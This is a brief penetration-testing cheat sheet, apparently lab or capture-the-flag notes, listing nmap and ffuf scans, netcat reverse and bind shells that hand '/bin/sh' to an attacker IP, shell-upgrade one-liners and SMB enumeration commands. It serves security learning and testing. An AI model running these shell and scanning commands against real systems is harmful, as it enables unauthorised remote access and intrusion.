# NMAP
~~~
nmap -T4 -p- -A <target ip>
~~~
# Python Webserver
~~~
python3 -m http.server <port>
~~~

# Netcat
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
~~~
## Reverse Shell
### Attacker Listener
nc -nlvp 4444

### Target Connecting
nc 192.168.1.2 4444 -e /bin/sh

## Bind Shell
### Attacker Connecting
nc 192.168.1.2 4444

### Target Listener
nc -nvlp 4444 -e /bin/sh
~~~

# TTY Shell
~~~
## Using python
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'

## Echo
echo 'os.system('/bin/bash')'

## sh
/bin/sh -i

## bash
/bin/bash -i

## Perl
perl -e 'exec "/bin/sh";'

## From within VI
:!bash
~~~
# System Info
~~~
uname -a
~~~
# Privilege Escalation Check
~~~
sudo -l
~~~
# OpenVPN
~~~
sudo openvpn <file>.vpn
~~~
# ffuf
~~~
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://<ip>/FUZZ
~~~
# SMB
~~~
* You can make use of // or \\\\...\\
## List SMB shares
smbclient -L \\\\<target ip>\\

## Connect to SMB share
smbclient \\\\<target ip>\\<share>
smbclient \\\\<target ip>\\<share> -U <user>
smbclient \\\\<target ip>\\<share> -U <user>%<password>
~~~

